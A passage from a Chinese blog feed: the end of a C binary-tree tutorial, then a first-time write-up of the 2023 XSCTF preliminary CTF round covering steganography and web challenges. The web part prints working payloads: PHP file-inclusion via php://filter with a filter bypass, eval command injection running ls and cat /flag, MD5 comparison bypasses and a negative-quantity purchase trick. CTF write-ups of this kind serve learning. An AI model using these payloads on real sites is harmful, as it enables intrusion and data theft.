class="title">BinaryTreeNode</span>*<span class="title">previous</span>=</span><span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyStack(S))&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">current</span>=</span>Pop(&amp;S);</span><br><span class="line">        <span class="keyword">if</span>(!previous||previous-&gt;left==current||previous-&gt;right==current)&#123;</span><br><span class="line">            <span class="comment">//如果当前节点为根节点或者previous节点为当前节点的父母节点。</span></span><br><span class="line">            <span class="keyword">if</span>(current-&gt;left)</span><br><span class="line">                Push(&amp;S,root-&gt;left);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(current-&gt;right)</span><br><span class="line">                Push(&amp;S,root-&gt;right);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(current-&gt;left==previous)&#123;</span><br><span class="line">            <span class="comment">//如果是从左节点返回的</span></span><br><span class="line">            <span class="keyword">if</span>(current-&gt;right)<span class="comment">//判断是否存在右孩子</span></span><br><span class="line">                Push(&amp;S,current-&gt;right);</span><br><span class="line">            <span class="keyword">else</span>&#123;<span class="comment">//如果是右节点，直接处理并弹出栈</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">                Pop(&amp;S);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        previous=current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="层次遍历"><a class="markdownIt-Anchor" href="#层次遍历"></a> 层次遍历</h5><p>层次遍历定义如下：</p><ul><li>访问根节点</li><li>在遍历l层节点的同时，将l+1层的节点依次插入列中。</li><li>访问下一层的所有节点</li><li>重复上述过程直到所有层上的节点均被访问为止。</li></ul><p>对上图给出的例树进行层次遍历，得到的节点访问序列为：1,2,3,4,5,6,7。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">temp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span>=</span>CreatQueue();</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    EnQueue(Q,root);</span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyQueue(Q))&#123;</span><br><span class="line">        temp= DeQueue(Q);<span class="comment">//弹出一个节点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);<span class="comment">//处理节点</span></span><br><span class="line">        <span class="comment">//存入下一层节点</span></span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;left)</span><br><span class="line">            EnQueue(Q,temp-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;right)</span><br><span class="line">            EnQueue(Q,temp-&gt;right)</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteQueue(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的问题集"><a class="markdownIt-Anchor" href="#二叉树的问题集"></a> 二叉树的问题集</h3><p>由于版面限制（懒），就不给出非递归算法的实现了（逃）。</p><h4 id="查找二叉树中的最大元素"><a class="markdownIt-Anchor" href="#查找二叉树中的最大元素"></a> 查找二叉树中的最大元素</h4><p>一个简单的思路是分别遍历其左右子树找出两个最大值，然后再比较这两者和根节点，取三者的最大值。借助递归可以很容易的实现算法。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FindMax</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="type">int</span> root_val,left,right,max=INT_MIN;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        root_val=root-&gt;data;</span><br><span class="line">        left= FindMax(root-&gt;left);</span><br><span class="line">        right= FindMax(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">            max=left;</span><br><span class="line">        <span class="keyword">else</span> max=right;</span><br><span class="line">        <span class="keyword">if</span>(root_val&gt;max)</span><br><span class="line">            max=root_val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="搜索二叉树中特定的元素"><a class="markdownIt-Anchor" href="#搜索二叉树中特定的元素"></a> 搜索二叉树中特定的元素</h4><p>给定一棵二叉树，判断节点的值是否为检索值，是则返回1，否则一直向下递归检索直到找到为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FindInBinaryTreeUsingRecursion</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)<span class="comment">//如果此时根为空就返回0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data==data)<span class="comment">//判断是否找到元素</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//返回左子树根的值，一直向下检索</span></span><br><span class="line">            temp = FindInBinaryTreeUsingRecursion(root-&gt;left, data);</span><br><span class="line">            <span class="keyword">if</span> (temp != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> temp;</span><br><span class="line">            <span class="comment">//左子树检索完毕则返回右子树的检索值</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> (FindInBinaryTreeUsingRecursion(root-&gt;right, data));</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在二叉树中插入元素"><a class="markdownIt-Anchor" href="#在二叉树中插入元素"></a> 在二叉树中插入元素</h4><p>利用层次遍历将节点插入一个无左孩子或右孩子的指针域中。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertInBinaryTree</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span>;</span><span class="comment">//层次遍历储存队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">temp</span>;</span><span class="comment">//临时节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>*<span class="title">newNode</span>;</span><span class="comment">//待插入节点</span></span><br><span class="line">    newNode=(<span class="keyword">struct</span> BinaryTreeNode*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> BinaryTreeNode));</span><br><span class="line">    newNode-&gt;left=newNode-&gt;right=<span class="literal">NULL</span>;<span class="comment">//初始化待插入节点</span></span><br><span class="line">    newNode-&gt;data=data;</span><br><span class="line">    <span class="keyword">if</span>(newNode==<span class="literal">NULL</span>)&#123;<span class="comment">//如果新节点申请错误</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!root)&#123;<span class="comment">//如果树不存在，直接把根节点变成新节点。</span></span><br><span class="line">        root=newNode;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//正式开始准备遍历插入</span></span><br><span class="line">    Q=CreatQueue();</span><br><span class="line">    EnQueue(Q,root);<span class="comment">//将根节点置入队列</span></span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyQueue(Q))&#123;</span><br><span class="line">        temp= DeQueue(Q);</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;left)</span><br><span class="line">            EnQueue(Q,temp-&gt;left);<span class="comment">//依次遍历节点的所有子树</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//如果节点左子树不存在，说明可插入</span></span><br><span class="line">            temp-&gt;left=newNode;</span><br><span class="line">            DeQueue(Q);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;right)</span><br><span class="line">            EnQueue(Q,temp-&gt;right);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            temp-&gt;right=newNode;</span><br><span class="line">            DeQueue(Q);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//结合队列先进先出的性质，元素会依次添加到树中</span></span><br><span class="line">    &#125;</span><br><span class="line">    DeleteQueue(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除二叉树"><a class="markdownIt-Anchor" href="#删除二叉树"></a> 删除二叉树</h4><p>要删除一棵二叉树，在删除它的双亲节点前必须要删干净它的孩子节点，所以采用后续遍历法遍历每一个节点后对它进行删除操作。</p><p>实现代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeleteBinaryTree</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    DeleteBinaryTree(root-&gt;left);</span><br><span class="line">    DeleteBinaryTree(root-&gt;right);</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><p>完结！当然也许后续可能会填坑二叉树的其他算法~O(∩_∩)O。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/1ec9d6b3b80ed38cc22ced07ffb1c4c3.jpg" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023XSCTF初赛部分WP</title>
      <link href="/posts/ceeb5ee39cd9/"/>
      <url>/posts/ceeb5ee39cd9/</url>
      
        <content type="html"><![CDATA[<p>献给，【打舞萌打的】。</p><p>第一次写wp，如有纰漏，还请多多见谅。</p><hr /><h1 id="write-up"><a class="markdownIt-Anchor" href="#write-up"></a> Write Up</h1><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="mommy_kafka"><a class="markdownIt-Anchor" href="#mommy_kafka"></a> Mommy_Kafka</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205025943.png" alt="image-20231014205025943" /></p><p>下载压缩包，解压。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205105049.png" alt="image-20231014205105049" /></p><p>发现有密码，但是题目没有给出任何和密码的信息。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205243055.png" alt="image-20231014205243055" /></p><p>压缩包内没有注释，于是考虑是伪加密。</p><p>用010Editor打开。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205505932.png" alt="image-20231014205505932" /></p><p>文件开头是PK，的确是一个压缩包，但是压缩文件数据区全局方式位标记为00 00，说明是没有加密的，那么本题一定是修改了压缩文件目录区的全局方式标记。搜索504B0102找到压缩文件目录区。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205735170.png" alt="image-20231014205735170" /></p><p>果然被修改过，将09 00改为00 00。保存，重新解压压缩包。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205844632.png" alt="image-20231014205844632" /></p><p>解压成功。</p><p>查看图片</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205917775.png" alt="image-20231014205917775" /></p><p>没有任何信息提示，考虑lsb隐写也没有找到有效信息。用010editor打开查看是否有其他信息隐藏在文件中。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210045282.png" alt="image-20231014210045282" /></p><p>发现文件末尾有隐藏信息，疑似base64加密。</p><p>丢进base解密脚本。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210152273.png" alt="image-20231014210152273" /></p><p>得到hint，使用steghide。</p><p>steghide是一款图片隐写软件，也可以反向解密出图片隐藏的信息，但是需要提供该图片加密时使用的密码。steghide虽然可以解密，但是没有提供爆破功能，所以需要使用脚本和自带字典或者第三方工具。</p><p>这里使用stegseek，需要在linux系统上运行，工具地址：<a href="https://github.com/RickdeJager/stegseek">RickdeJager/stegseek: ⚡ Worlds fastest steghide cracker, chewing through millions of passwords per second ⚡ (github.com)</a></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210438034.png" alt="image-20231014210438034" /></p><p>爆破得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/3dc0ddaedf89a8baebc5b0bee200832.png" alt="3dc0ddaedf89a8baebc5b0bee200832" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/aae182042b7630f38d57cdfbef07933.png" alt="aae182042b7630f38d57cdfbef07933" /></p><p>flag为<code>XSCTF&#123;M0mmy_L0v3_Me_th3_mo5t&#125;</code></p><h3 id="oursecret_for_zero"><a class="markdownIt-Anchor" href="#oursecret_for_zero"></a> Oursecret_for_zero</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015005909159.png" alt="image-20231015005909159" /></p><p>下载附件，打开得到一个图片和txt文本文件。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015005951989.png" alt="image-20231015005951989" /></p><p>图片看似是一张普通的图片，其实是后面我们会用到的神奇妙妙工具。先看password.txt。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010124395.png" alt="image-20231015010124395" /></p><p>确实很奇怪，这时候结合题目hint和信息，搜索零宽隐写，得到一个解密网站<a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a>。放入信息解密。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010531120.png" alt="image-20231015010531120" /></p><p>得到hint：<code>Here is your passwd:A_n3w_ste9_way</code>。明显是有一个需要密钥的图片隐写在里面。</p><p>一开始我以为又是steghide，但是解析不出来，所以又回到题目。题目提示大写了OURSECRET，于是百度之。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010709588.png" alt="image-20231015010709588" /></p><p>还真有这么个工具。于是下载好之后把图片拖进去输入密码后就可得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010818291.png" alt="image-20231015010818291" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010831232.png" alt="image-20231015010831232" /></p><p>flag为：<code>XSCTF&#123;WeLc0m3_to_s7eg_w0rld&#125;</code>。</p><h3 id="0xf-and-0xf"><a class="markdownIt-Anchor" href="#0xf-and-0xf"></a> 0xf and 0xf</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133103503.png" alt="image-20231016133103503" /></p><p>下载附件，打开是一个加密编码的文本文件。</p><p>结合hint和题目名。两个0xf，就是两个十六进制。</p><p>搜索双十六进制解码</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133316939.png" alt="image-20231016133316939" /></p><p>进入解密网站<a href="https://www.calcresult.com/misc/cyphers/twin-hex.html">Twin-Hex Cypher encoder and decoder from CalcResult Universal Calculators</a>解密两次得到flag。（藏得太深了，受不了）</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133552996.png" alt="image-20231016133552996" style="zoom:50%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133605957.png" alt="image-20231016133605957" style="zoom:50%;" /><p>flag为<code>XSCTF&#123;Cs3ome_13_pwn_k1ng&#125;</code>。</p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="hacker"><a class="markdownIt-Anchor" href="#hacker"></a> Hacker</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210609801.png" alt="image-20231014210609801" /></p><p>进入网页</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210630674.png" alt="image-20231014210630674" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210637117.png" alt="image-20231014210637117" /></p><p>查看页面源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211006246.png" alt="image-20231014211006246" /></p><p>发现flag<code>XSCTF&#123;Y0u_can_no7_f1nd_m3_?&#125;</code>。</p><h3 id="ezgame"><a class="markdownIt-Anchor" href="#ezgame"></a> ezgame</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211056423.png" alt="image-20231014211056423" /></p><p>进入网站。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211121346.png" alt="image-20231014211121346" /></p><p>是一个部署在前端的小游戏，所以不用抓包，一般使用开发者模式在本地修改JS代码来达到目的。</p><p>总之先对JS代码进行审计，但是右键被禁用，应该是JS禁止了这个行为。所以用Ctrl+U打开页面源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211358956.png" alt="image-20231014211358956" /></p><p>对其中的JS文件进行审计，搜索敏感词score。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211515918.png" alt="image-20231014211515918" /></p><p>太多了，搜索highscore。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211549074.png" alt="image-20231014211549074" /></p><p>发现敏感代码，在最高分大于1000000时执行。查看decryptString函数。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211631163.png" alt="image-20231014211631163" /></p><p>在Python中复现解密脚本，解出flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211728402.png" alt="image-20231014211728402" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211736172.png" alt="image-20231014211736172" /></p><p>flag为<code>flag&#123;basju_D0G006706_iajdisaia&#125;</code>。</p><h3 id="canyoupassit"><a class="markdownIt-Anchor" href="#canyoupassit"></a> canyoupassit</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211826174.png" alt="image-20231014211826174" /></p><p>进入网站，发现是PHP审计。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211904126.png" alt="image-20231014211904126" /></p><p>主要考察的是PHP下md5函数的特性。</p><p>对于第一关，要求post传参a1和b1不相同但是md5值相同，很经典的md5碰撞问题。我们这里可以MD5碰撞（MD5值以0e开头）也可以用php数组绕过。这里用md5碰撞，取<code>a1=QNKCDZO</code>与``b1=240610708`即可。</p><p>第二关要求post传参key值，使得其与自身md5值碰撞。这里是弱类型比较，本来想用数组绕过，但是网页不知道为什么无回显，于是继续使用0e碰撞，取<code>key=0e215962017</code>。</p><p>第三关要求post传参a2、b2，要求a2、b2不相同，且以$now开头，且两者md5值强相等。这里的$now是当前时间戳。手动传参肯定不行了，于是考虑用Python构造payload传参，脚本如下。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://43.248.97.200:40038/&quot;</span></span><br><span class="line">t=<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))<span class="comment">#获取当前时间戳</span></span><br><span class="line"><span class="comment">#print(str(t))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;在a2、b2后加上两个数字使其不相同&#x27;&#x27;&#x27;</span></span><br><span class="line">a2=t+<span class="string">&quot;0&quot;</span></span><br><span class="line">b2=t+<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="comment">#print(a2,b2)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;构造payload&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;a1&#x27;</span>: <span class="string">&#x27;QNKCDZO&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b1&#x27;</span>: <span class="string">&#x27;240610708&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;0e215962017&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a2&#x27;</span>: a2,</span><br><span class="line">    <span class="string">&#x27;b2&#x27;</span>: b2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>值得一提的是，本来这里我也打算用a2和b2数组绕过的，但是不知道为什么又没有回显。百无聊赖之际把数组去掉试试，没想到竟然爆了flag，理论上第三个md5函数应该通不过的啊，难道md5函数处理字符数有上限？自动截取了前十个时间戳转换吗。</p><p>总之成功解出flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213426176.png" alt="image-20231014213426176" /></p><p>flag为<code>flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125;</code>。</p><h3 id="reallyexpensive"><a class="markdownIt-Anchor" href="#reallyexpensive"></a> reallyExpensive</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213532015.png" alt="image-20231014213532015" /></p><p>进入网址</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213556378.png" alt="image-20231014213556378" /></p><p>是一个简陋的登录页面，猜想sql注入或者弱口令，但是先稳一手注册。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213651989.png" alt="image-20231014213651989" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213704013.png" alt="image-20231014213704013" /></p><p>没想到直接进了。</p><p>这里我要严重吐槽一下出题人，环境搭的有问题。本题容器在火狐上打开有bug。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2ffc2683318716e5b583bcdf84a3062.png" alt="2ffc2683318716e5b583bcdf84a3062" /></p><p>然后我偏偏hackbar和bp都配在火狐上，导致我死活进不去抓包，浪费了起码几个小时。最后用bp自带的浏览器打开，进入抓包。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214206343.png" alt="image-20231014214206343" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214226792.png" alt="image-20231014214226792" /></p><p>这里post了两个参数number和goodId，很容易联想到后端的计算方法应该是用金额数减去数量乘以价格来判断是否购买成功，于是修改number为负数，就可以购买flag5了。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214350464.png" alt="image-20231014214350464" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214424659.png" alt="image-20231014214424659" /></p><p>得到flag，且余额增加了999999999，验证了我之前的猜想。</p><p>flag为<code>flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125;</code>。</p><h3 id="badbad_filename"><a class="markdownIt-Anchor" href="#badbad_filename"></a> Badbad_filename</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214539599.png" alt="image-20231014214539599" /></p><p>进入容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215023822.png" alt="image-20231014215023822" /></p><p>题目暗示很明显，用get传参filename，然后后者会被文件包含，经典的文件包含漏洞题，联想到使用PHP伪协议，于是构造payload为<code>/?filename=php://filter/convert.base64-encode/resource=index.php</code></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215306191.png" alt="image-20231014215306191" /></p><p>被过滤了，但是只是单纯的从语句中去掉了过滤词，使用双写绕过。</p><p>构造payload<code>/?filename=pphphphpp://filtfilterer/convert.babasese64-encode/resource=index.pphphphpp</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215428340.png" alt="image-20231014215428340" /></p><p>payload有效，得到index.php的源代码，送进CyberChef解密。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215521978.png" alt="image-20231014215521978" /></p><p>可以看到index文件开头执行了flag.php，于是构造payl为<code>pphphphpp://filtfilterer/convert.babasese64-encode/resource=flag.pphphphpp</code>直接查看flag，再解码即可。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215636748.png" alt="image-20231014215636748" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215701209.png" alt="image-20231014215701209" /></p><p>得到flag<code>XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125;</code>。</p><h3 id="eval_eval_我的"><a class="markdownIt-Anchor" href="#eval_eval_我的"></a> eval_eval_我的</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215750403.png" alt="image-20231014215750403" /></p><p>进入容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215810981.png" alt="image-20231014215810981" /></p><p>又是一道PHP代码审计题</p><p>题目要求get传参xsctf，且用正则过滤黑名单。如果通过则再检验post传参Xp0int和Sloth，要求两参数不相同但md5值强相等，如果通过则执行eval函数。这题要在正则过滤的限制下利用文件执行漏洞执行xsctf获得flag。</p><p>首先考虑参数Xp0int和Sloth，用数组绕过即可。post传参<code>Xp0int[]=0&amp;Sloth[]=1</code>即可。</p><p>接下来考虑如何绕过正则来执行文件。</p><p>构造payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?xsctf=echo(`ls`);</span><br></pre></td></tr></table></figure><p>因为过滤了空格，用<code>echo()</code>来绕过。同时用反引号``，在PHP中会把echo反引号内的内容当做PHP代码执行，效果如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014220943778.png" alt="image-20231014220943778" /></p><p>无敏感文件，继续查看上一级目录。构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?xsctf=echo(`ls\x20/`);</span><br></pre></td></tr></table></figure><p>用\x20来绕过空格，\x20在PHP中被解释为空格，得到以下结果。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014221507041.png" alt="image-20231014221507041" /></p><p>发现flag，查看文件。构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?xsctf=echo(`ca&#x27;&#x27;t\x20/fl&#x27;&#x27;ag`);</span><br></pre></td></tr></table></figure><p>使用双单引号绕过正则匹配，得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014221740959.png" alt="image-20231014221740959" /></p><p>flag为<code>XSCTF&#123;YoU_F1NalLy_EvaLLL_m3!!&#125;</code>。</p><h3 id="upload_quick"><a class="markdownIt-Anchor" href="#upload_quick"></a> upload_quick</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131246415.png" alt="image-20231015131246415" /></p><p>开启容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131312723.png" alt="image-20231015131312723" /></p><p>是一个登录界面，尝试输入账户密码登录。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131347330.png" alt="image-20231015131347330" /></p><p>无论输入什么都会被弹窗打断，没有任何反应。同时发现右键被禁用，于是Ctrl+U查看源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131516279.png" alt="image-20231015131516279" /></p><p>大概的意思是，无论在登录框执行什么操作都会被打断。于是开始查看其他方面，同时发现四个可疑JS文件，查看之。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131633889.png" alt="image-20231015131633889" /></p><p>其中EasePack.min.js很明显经过了混淆，使用在线工具网站<a href="https://tool.chinaz.com/Tools/JsFormat.aspx">JS/HTML格式化 - 站长工具 (chinaz.com)</a>来反混淆。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131750553.png" 